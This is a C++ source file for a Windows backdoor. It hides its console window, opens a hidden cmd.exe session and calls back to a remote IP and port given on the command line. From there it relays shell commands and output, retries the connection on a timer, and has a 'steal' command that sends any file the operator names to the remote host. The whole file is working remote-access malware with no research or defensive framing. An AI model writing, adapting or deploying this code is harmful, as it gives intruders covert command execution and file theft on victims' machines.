
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#include <BaseTsd.h>
#include <Windows.h>
#include <string>
#include <ws2tcpip.h>
typedef SSIZE_T ssize_t;

char * server_ip;
int server_port;
int interval;

DWORD dwRead;

SOCKET m_socket;

static const int BUFFER_SIZE = 16 * 1024;

using std::string;

HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;

void WriteToPipe(string msg);
void ReadFromPipe(void);

static void SendFile(const char * fileName)
{
	FILE * fpIn = fopen(fileName, "r");
	char buf[BUFFER_SIZE];
	while (1)
	{
		ssize_t bytesRead = fread(buf, 1, sizeof(buf), fpIn);
		if (bytesRead <= 0) break;  // EOF
		send(m_socket, buf, bytesRead, 0);
	}
}

int ReceiveFile(int port, const char * fileName)
{
	int s = socket(AF_INET, SOCK_STREAM, 0);
	if (s >= 0)
	{
#ifndef WIN32
		// (Not necessary under windows -- it has the behaviour we want by default)
		const int trueValue = 1;
		(void)setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &trueValue, sizeof(trueValue));
#endif

		struct sockaddr_in saAddr; memset(&saAddr, 0, sizeof(saAddr));
		saAddr.sin_family = AF_INET;
		saAddr.sin_addr.s_addr = htonl(0);  // (IPADDR_ANY)
		saAddr.sin_port = htons(port);

		if ((bind(s, (struct sockaddr *) &saAddr, sizeof(saAddr)) == 0) && (listen(s, 10) == 0))
		{
			memset(&saAddr, 0, sizeof(saAddr));
			socklen_t len = sizeof(saAddr);
			int connectSocket = accept(s, (struct sockaddr *) &saAddr, &len);
			if (connectSocket >= 0)
			{
				FILE * fpIn = fopen(fileName, "w");
				if (fpIn)
				{
					char buf[BUFFER_SIZE];
					while (1)
					{
						ssize_t bytesReceived = recv(connectSocket, buf, sizeof(buf), 0);
						if (bytesReceived < 0) return 1;  // network error?
						if (bytesReceived == 0) break;   // sender closed connection, must be end of file

						if (fwrite(buf, 1, bytesReceived, fpIn) != (size_t)bytesReceived)
						{
							return 2; //file write error
							break;
						}
					}

					fclose(fpIn);
				}
				else return 2; //couldn't open file for writing
				closesocket(connectSocket);
			}
		}
		else return 3; //socket bind error
		closesocket(s);
		return 0; //success
	}
	else return 4; //socket error
}

int mainLoop() {
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR)
		return 1;
	// Create a socket.
	m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	// Just test using the localhost, you can try other IP address
	clientService.sin_addr.s_addr = inet_addr(server_ip);
	clientService.sin_port = htons(server_port);
	if (connect(m_socket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
		return 1;
	}

	// Send and receive data.
	int bytesSent;
	int bytesRecv = SOCKET_ERROR;
	// Be careful with the array bound, provide some checking mechanism...
	char sendbuf[16000] = "";
	char recvbuf[16000] = "";
	char inFromPipe[16000] = "";
	int inLen = 0;
	int prevLen = 0;
	// Receives some test string to server...
	while (true)
	{
		ReadFromPipe();

		bytesRecv = recv(m_socket, recvbuf, 16000, 0);
		if (bytesRecv == 0 || bytesRecv == WSAECONNRESET)
		{
			break;
		}
		if (bytesRecv < 0)
			return 0;
		else {
			if (recvbuf == "exit") return 0;
			if (strncmp(recvbuf, "steal", strlen("steal")) == 0) {
				char path[16000];
				memcpy(path, &recvbuf[6], strlen(recvbuf) - 7);
				SendFile(path);
			}
			WriteToPipe(recvbuf);
			recvbuf[0] = 0;
		}

	}
	WSACleanup();
	return 0;
}

int main(int argc, char ** argv){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	server_ip = argv[1];
	server_port = atoi(argv[2]);
	interval = atoi(argv[3]);
	
	//BEFORE sending/recieving, open a command line session and redirect its I/O to our pipes
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Create pipes for the child process's STDOUT and STDIN,
	// ensures both handle are not inherited
	CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

	CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

	
	// CREATE CHILD PROCESS

	TCHAR szCmdline[] = TEXT("cmd.exe");
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;

	// Set up members of the PROCESS_INFORMATION structure.
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure.
	// This structure specifies the STDIN and STDOUT handles for redirection.
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, 0,
		NULL, NULL, &siStartInfo, &piProcInfo);

	// Close handles to the child process and its primary thread.
	// Some applications might keep these handles to monitor the status
	// of the child process, for example. 
	CloseHandle(g_hChildStd_OUT_Wr);
	CloseHandle(g_hChildStd_IN_Rd);
	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);
	
	//Done opening command line session
	while (1) {
		mainLoop();
		Sleep(interval);
	}
}

void WriteToPipe(string msg)
{
	WriteFile(g_hChildStd_IN_Wr, msg.c_str(), msg.size(), NULL, NULL);
}

void ReadFromPipe(void)
{
	const int BUFSIZE = 512;
	DWORD maxReadSize = 512;
	DWORD readSize = 0;
	int itNum = 0;
	DWORD sessionRead;
	BOOL bSuccess = FALSE;
	BOOL hasBeenRead = false;
	Sleep(333);

	for (;;)
	{
		CHAR chBuf[BUFSIZE];
		PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, maxReadSize, &readSize, NULL, NULL);
		if (hasBeenRead && readSize <= 0) break;
		if (readSize > 0) {
			hasBeenRead = true; //read in at least 1 byte :)
		}
		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, readSize, &sessionRead, NULL);
		if (!bSuccess || sessionRead <= 0) break;
		dwRead += sessionRead;
		if (readSize < maxReadSize) {
			chBuf[readSize] = 0;
		}
		send(m_socket, chBuf, readSize, 0);
		memset(&chBuf[0], 0, sizeof(chBuf));
		if (itNum > 100) {
			maxReadSize /= 2;
			itNum = 0;
		}
		itNum++;
	}
}